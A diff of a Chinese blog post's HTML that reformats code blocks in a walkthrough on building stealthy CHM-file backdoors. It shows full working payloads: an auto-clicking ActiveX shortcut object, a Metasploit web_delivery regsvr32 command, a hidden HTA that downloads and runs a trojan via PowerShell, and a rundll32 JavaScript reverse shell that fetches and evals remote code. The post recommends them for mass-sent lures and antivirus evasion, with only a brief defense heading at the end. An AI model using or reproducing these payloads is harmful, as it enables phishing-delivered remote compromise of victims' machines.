@@ -165,112 +165,26 @@
 <p>选择文件—编译，即可编译成CHM文件。</p>
 <p><strong>举个例子</strong></p>
 <p>弹出计算器</p>
-<p>test.html 的内容为:</p>
-<pre><code>&lt;!DOCTYPE HTML&gt;
-&lt;HTML&gt;
-&lt;HEAD&gt;
-&lt;META HTTP-EQUIV=&quot;Content-Type&quot; Content=&quot;text/html; charset=utf-8&quot;&gt;
-
-&lt;TITLE&gt;test&lt;/TITLE&gt;
-&lt;/HEAD&gt;
-
-&lt;BODY BGCOLOR=&quot;#FFFFFF&quot; TEXT=&quot;#000000&quot;&gt;
-&lt;OBJECT id=autoloader classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;
-    &lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;
-    &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;
-    &lt;PARAM name=&quot;Item1&quot; value=&quot;,calc.exe,&quot;&gt;
-    &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;
-&lt;/OBJECT&gt;
-&lt;SCRIPT&gt;
-    autoloader.Click();
-&lt;/SCRIPT&gt;
-
-&lt;p&gt;Just a test!&lt;/p&gt;
-&lt;/BODY&gt;
-&lt;/HTML&gt;
-</code></pre><p><code>&lt;OBJECT&gt;</code> 和 <code>&lt;SCRIPT&gt;</code> 为核心代码，只需将这段代码插入任意html中即可。</p>
+<p>test.html 的内容为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;HEAD&gt;</span><br><span class="line">&lt;META HTTP-EQUIV=&quot;Content-Type&quot; Content=&quot;text/html; charset=utf-8&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;TITLE&gt;test&lt;/TITLE&gt;</span><br><span class="line">&lt;/HEAD&gt;</span><br><span class="line"></span><br><span class="line">&lt;BODY BGCOLOR=&quot;#FFFFFF&quot; TEXT=&quot;#000000&quot;&gt;</span><br><span class="line">&lt;OBJECT id=autoloader classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;</span><br><span class="line">	&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;</span><br><span class="line">	&lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line">	&lt;PARAM name=&quot;Item1&quot; value=&quot;,calc.exe,&quot;&gt;</span><br><span class="line">	&lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;/OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">	autoloader.Click();</span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;Just a test!&lt;/p&gt;</span><br><span class="line">&lt;/BODY&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure></p>
+<p><code>&lt;OBJECT&gt;</code> 和 <code>&lt;SCRIPT&gt;</code> 为核心代码，只需将这段代码插入任意html中即可。</p>
 <p>按照上述过程制作test.chm文件<br>双击生成的.chm文件<br><img src="/2019/10/29/gou-zao-wu-hen-chm-hou-men/4.png" alt=""></p>
-<h2 id="0x02-借助chm实现meterpreter上线"><a href="#0x02-借助chm实现meterpreter上线" class="headerlink" title="0x02 借助chm实现meterpreter上线"></a>0x02 借助chm实现meterpreter上线</h2><p>既然现在都能弹计算器了,很明显,弹个meterpreter又会有多难呢,首先,先把msf起起来准备好相应的payload,如下</p>
-<pre><code>msf5 &gt; use exploit/multi/script/web_delivery 
-msf5 exploit(multi/script/web_delivery) &gt; set target 3
-target =&gt; 3
-msf5 exploit(multi/script/web_delivery) &gt; set payload windows/meterpreter/reverse_tcp_uuid 
-payload =&gt; windows/meterpreter/reverse_tcp_uuid
-msf5 exploit(multi/script/web_delivery) &gt; set lhost 192.168.72.23
-lhost =&gt; 192.168.72.23
-msf5 exploit(multi/script/web_delivery) &gt; set lport 5555
-lport =&gt; 5555
-msf5 exploit(multi/script/web_delivery) &gt; set exitonsession false
-exitonsession =&gt; false
-msf5 exploit(multi/script/web_delivery) &gt; exploit -j
-[*] Exploit running as background job 0.
-[*] Exploit completed, but no session was created.
-
-[*] Started reverse TCP handler on 192.168.72.23:5555 
-[*] Using URL: http://0.0.0.0:8080/CSw0SdX2n23YH
-[*] Local IP: http://192.168.72.23:8080/CSw0SdX2n23YH
-[*] Server started.
-[*] Run the following command on the target machine:
-regsvr32 /s /n /u /i:http://192.168.72.23:8080/CSw0SdX2n23YH.sct scrobj.dll
-</code></pre><p>接着,只需要把弹计算器部分的命令替换成上面远程加载执行payload的命令即可,而后再重新编译为chm</p>
-<pre><code>&lt;OBJECT id=autoloader classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;
-    &lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;
-    &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;
-    &lt;PARAM name=&quot;Item1&quot; value=&quot;,regsvr32,/s /n /u /i:http://192.168.3.14:8080/WzRAPJ4u2Pp2IAL.sct scrobj.dll&quot;&gt;
-    &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;
-&lt;/OBJECT&gt;
-&lt;SCRIPT&gt;
-    autoloader.Click();
-&lt;/SCRIPT&gt;
-</code></pre><p>不过，在目标执行chm文件之后，却出现如下错误，目前尚未解决<br><img src="/2019/10/29/gou-zao-wu-hen-chm-hou-men/7.png" alt=""></p>
+<h2 id="0x02-借助chm实现meterpreter上线"><a href="#0x02-借助chm实现meterpreter上线" class="headerlink" title="0x02 借助chm实现meterpreter上线"></a>0x02 借助chm实现meterpreter上线</h2><p>既然现在都能弹计算器了,很明显,弹个meterpreter又会有多难呢,首先,先把msf起起来准备好相应的payload,如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/script/web_delivery </span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; set target 3</span><br><span class="line">target =&gt; 3</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; set payload windows/meterpreter/reverse_tcp_uuid </span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp_uuid</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; set lhost 192.168.72.23</span><br><span class="line">lhost =&gt; 192.168.72.23</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; set lport 5555</span><br><span class="line">lport =&gt; 5555</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; set exitonsession false</span><br><span class="line">exitonsession =&gt; false</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.72.23:5555 </span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/CSw0SdX2n23YH</span><br><span class="line">[*] Local IP: http://192.168.72.23:8080/CSw0SdX2n23YH</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">regsvr32 /s /n /u /i:http://192.168.72.23:8080/CSw0SdX2n23YH.sct scrobj.dll</span><br></pre></td></tr></table></figure></p>
+<p>接着,只需要把弹计算器部分的命令替换成上面远程加载执行payload的命令即可,而后再重新编译为chm<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;OBJECT id=autoloader classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;</span><br><span class="line">	&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;</span><br><span class="line">	&lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line">	&lt;PARAM name=&quot;Item1&quot; value=&quot;,regsvr32,/s /n /u /i:http://192.168.3.14:8080/WzRAPJ4u2Pp2IAL.sct scrobj.dll&quot;&gt;</span><br><span class="line">	&lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;/OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">	autoloader.Click();</span><br><span class="line">&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure></p>
+<p>不过，在目标执行chm文件之后，却出现如下错误，目前尚未解决<br><img src="/2019/10/29/gou-zao-wu-hen-chm-hou-men/7.png" alt=""></p>
 <h2 id="0x03-利用chm实现自定义木马上线"><a href="#0x03-利用chm实现自定义木马上线" class="headerlink" title="0x03 利用chm实现自定义木马上线"></a>0x03 利用chm实现自定义木马上线</h2><p><strong>注意:</strong> 最好不要再直接用powershell或者cmd去远程执行下载,不然在打开chm时会飘黑框</p>
-<p>为了能让chm在打开时不弹黑框,此处我们就用一种比较间接的方式,用hta来帮我们在前面挡一刀,即 用先在chm里执行hta,而hta里放的则是远程加载执行我们自己马的powershell代码,具体如下</p>
-<pre><code># /etc/init.d/apache2 start
-# mv /home/test/Desktop/chmbackdoor.exe /var/www/html/
-# mv /home/test/Desktop/downloader.sct /var/www/html/
-# netstat -tulnp
-</code></pre><pre><code># cat loader.hta        可以清晰的看到,此hta中放的才是真正的ps下载者
-
-&lt;HTML&gt; 
-    &lt;HEAD&gt;
-    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
-    &lt;script language=&quot;VBScript&quot;&gt;
-    Sub window_onload
-        window.resizeTo 0,0
-        window.MoveTo -100,-100
-        const impersonation = 3
-        Const HIDDEN_WINDOW = 12
-        Set Locator = CreateObject(&quot;WScript.Shell&quot;)
-        Locator.Run&quot;PowerShell.exe (New-Object System.Net.WebClient).DownloadFile(&#39;http://192.168.3.14/chmbackdoor.exe&#39;,&#39;c:\\windows\\temp\\chmbackdoor.exe&#39;);(New-Object -com Shell.Application).ShellExecute(&#39;c:\\windows\\temp\\chmbackdoor.exe&#39;);&quot;,0,FALSE
-        window.close()
-    end sub
-    &lt;/script&gt;
-    &lt;/HEAD&gt;
-&lt;/HTML&gt;
-</code></pre><p>而在chm文件中则是执行上面hta,但执行hta本身却是没有黑框的</p>
-<pre><code>&lt;OBJECT id=autoloader classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;
-    &lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;
-    &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;
-    &lt;PARAM name=&quot;Item1&quot; value=&quot;,mshta,http://192.168.3.14/loader.hta&quot;&gt;
-    &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;
-&lt;/OBJECT&gt;
-&lt;SCRIPT&gt;
-    autoloader.Click();
-&lt;/SCRIPT&gt;
-</code></pre><p>当目标正常双击打开我们发给他的chm文件时,稍等片刻[ps下载稍微需要点儿时间],另外,因为是下载自己的马,所以免杀和马的体积[越小越好]要务必处理好<br><img src="/2019/10/29/gou-zao-wu-hen-chm-hou-men/11.png" alt=""></p>
+<p>为了能让chm在打开时不弹黑框,此处我们就用一种比较间接的方式,用hta来帮我们在前面挡一刀,即 用先在chm里执行hta,而hta里放的则是远程加载执行我们自己马的powershell代码,具体如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># /etc/init.d/apache2 start</span><br><span class="line"># mv /home/test/Desktop/chmbackdoor.exe /var/www/html/</span><br><span class="line"># mv /home/test/Desktop/downloader.sct /var/www/html/</span><br><span class="line"># netstat -tulnp</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># cat loader.hta		可以清晰的看到,此hta中放的才是真正的ps下载者</span><br><span class="line"></span><br><span class="line">&lt;HTML&gt; </span><br><span class="line">	&lt;HEAD&gt;</span><br><span class="line">	&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;</span><br><span class="line">	&lt;script language=&quot;VBScript&quot;&gt;</span><br><span class="line">	Sub window_onload</span><br><span class="line">		window.resizeTo 0,0</span><br><span class="line">		window.MoveTo -100,-100</span><br><span class="line">		const impersonation = 3</span><br><span class="line">		Const HIDDEN_WINDOW = 12</span><br><span class="line">		Set Locator = CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">		Locator.Run&quot;PowerShell.exe (New-Object System.Net.WebClient).DownloadFile(&apos;http://192.168.3.14/chmbackdoor.exe&apos;,&apos;c:\\windows\\temp\\chmbackdoor.exe&apos;);(New-Object -com Shell.Application).ShellExecute(&apos;c:\\windows\\temp\\chmbackdoor.exe&apos;);&quot;,0,FALSE</span><br><span class="line">		window.close()</span><br><span class="line">	end sub</span><br><span class="line">	&lt;/script&gt;</span><br><span class="line">	&lt;/HEAD&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>
+<p>而在chm文件中则是执行上面hta,但执行hta本身却是没有黑框的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;OBJECT id=autoloader classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;</span><br><span class="line">	&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;</span><br><span class="line">	&lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line">	&lt;PARAM name=&quot;Item1&quot; value=&quot;,mshta,http://192.168.3.14/loader.hta&quot;&gt;</span><br><span class="line">	&lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;/OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">	autoloader.Click();</span><br><span class="line">&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure></p>
+<p>当目标正常双击打开我们发给他的chm文件时,稍等片刻[ps下载稍微需要点儿时间],另外,因为是下载自己的马,所以免杀和马的体积[越小越好]要务必处理好<br><img src="/2019/10/29/gou-zao-wu-hen-chm-hou-men/11.png" alt=""></p>
 <h2 id="0x04-利用js来无痕触发chm后门"><a href="#0x04-利用js来无痕触发chm后门" class="headerlink" title="0x04 利用js来无痕触发chm后门"></a>0x04 利用js来无痕触发chm后门</h2><p><strong>第一种方式</strong><br>直接powershell脚本来免杀弹回一个半交互的shell，这种方式通常比较适合针对单个单点拿shell,可能需要人一直守着,一旦看到上了以后,就需要里面进行下一步的动作,脚本的具体使用,如下,先修改监听ip,为本机ip[实战中肯定是用vps的公网ip来搞]</p>
-<p><a href="https://github.com/3gstudent/Javascript-Backdoor/blob/master/JSRat.ps1" title="JSRat.ps1" target="_blank" rel="noopener">https://github.com/3gstudent/Javascript-Backdoor/blob/master/JSRat.ps1</a></p>
-<pre><code>$Server = &#39;192.168.72.23&#39; #Listening IP. Change This.
-</code></pre><p>而后加载执行脚本开始监听</p>
-<pre><code>powershell.exe -ExecutionPolicy Bypass -File JSRat.ps1
-</code></pre><p><img src="/2019/10/29/gou-zao-wu-hen-chm-hou-men/9.png" alt=""><br>接下来的事情就是把下面的利用代码替换到我们事先准备好的chm中,具体如下,记得里面的ip要改成上面监听的ip,另外,务必要注意value=中的单双引号问题,否则语法错误会造成payload无法被正常执行</p>
-<pre><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);w=new%20ActiveXObject(&quot;WScript.Shell&quot;);try{v=w.RegRead(&quot;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet%20Settings\\ProxyServer&quot;);q=v.split(&quot;=&quot;)[1].split(&quot;;&quot;)[0];h.SetProxy(2,q);}catch(e){}h.Open(&quot;GET&quot;,&quot;http://192.168.72.11/connect&quot;,false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);}
-</code></pre><p>之后,再重新编译chm,丢到目标机器上打开,即可看到一个cmd shell被正常弹回,只不过,这里稍微有点瑕疵,当第一次打开chm的一瞬间,会有所卡顿[其实这个过程就是在执行payload,也可能是rudll32的问题,regsvr32就不会],而之后再打开,就没有多大感觉了</p>
+<p><a href="https://github.com/3gstudent/Javascript-Backdoor/blob/master/JSRat.ps1" title="JSRat.ps1" target="_blank" rel="noopener">https://github.com/3gstudent/Javascript-Backdoor/blob/master/JSRat.ps1</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Server = &apos;192.168.72.23&apos; #Listening IP. Change This.</span><br></pre></td></tr></table></figure></p>
+<p>而后加载执行脚本开始监听<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -ExecutionPolicy Bypass -File JSRat.ps1</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/10/29/gou-zao-wu-hen-chm-hou-men/9.png" alt=""><br>接下来的事情就是把下面的利用代码替换到我们事先准备好的chm中,具体如下,记得里面的ip要改成上面监听的ip,另外,务必要注意value=中的单双引号问题,否则语法错误会造成payload无法被正常执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);w=new%20ActiveXObject(&quot;WScript.Shell&quot;);try&#123;v=w.RegRead(&quot;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet%20Settings\\ProxyServer&quot;);q=v.split(&quot;=&quot;)[1].split(&quot;;&quot;)[0];h.SetProxy(2,q);&#125;catch(e)&#123;&#125;h.Open(&quot;GET&quot;,&quot;http://192.168.72.11/connect&quot;,false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;</span><br></pre></td></tr></table></figure></p>
+<p>之后,再重新编译chm,丢到目标机器上打开,即可看到一个cmd shell被正常弹回,只不过,这里稍微有点瑕疵,当第一次打开chm的一瞬间,会有所卡顿[其实这个过程就是在执行payload,也可能是rudll32的问题,regsvr32就不会],而之后再打开,就没有多大感觉了</p>
 <p>Shell回来以后,为了巩固权限,可立即远程加载执行自己的马,毕竟,一个cmd shell肯定活不了多长时间<br><img src="/2019/10/29/gou-zao-wu-hen-chm-hou-men/10.png" alt=""></p>
 <p><strong>第二种方式</strong></p>
-<p>原理一样,只不过这次是用python脚本,主要针对想自动批量上线的需求[适合群发]<br><a href="https://github.com/Ridter/MyJSRat" title="MyJSRat.py" target="_blank" rel="noopener">https://github.com/Ridter/MyJSRat</a></p>
-<pre><code>python MyJSRat.py -i 192.168.1.101 -p 3333
-</code></pre><p>访问 <a href="http://192.168.72.23:3333/wtf" target="_blank" rel="noopener">http://192.168.72.23:3333/wtf</a> 获取攻击代码如下：<br><img src="/2019/10/29/gou-zao-wu-hen-chm-hou-men/5.png" alt=""></p>
+<p>原理一样,只不过这次是用python脚本,主要针对想自动批量上线的需求[适合群发]<br><a href="https://github.com/Ridter/MyJSRat" title="MyJSRat.py" target="_blank" rel="noopener">https://github.com/Ridter/MyJSRat</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python MyJSRat.py -i 192.168.1.101 -p 3333</span><br></pre></td></tr></table></figure></p>
+<p>访问 <a href="http://192.168.72.23:3333/wtf" target="_blank" rel="noopener">http://192.168.72.23:3333/wtf</a> 获取攻击代码如下：<br><img src="/2019/10/29/gou-zao-wu-hen-chm-hou-men/5.png" alt=""></p>
 <p>将攻击代码写入html文件<br><img src="/2019/10/29/gou-zao-wu-hen-chm-hou-men/6.png" alt=""></p>
 <p>编译以后运行，可以成功获取JS交互shell<br><img src="/2019/10/29/gou-zao-wu-hen-chm-hou-men/8.png" alt=""></p>
 <h2 id="0x05-针对chm的后门的有效防御"><a href="#0x05-针对chm的后门的有效防御" class="headerlink" title="0x05 针对chm的后门的有效防御"></a>0x05 针对chm的后门的有效防御</h2><ol>
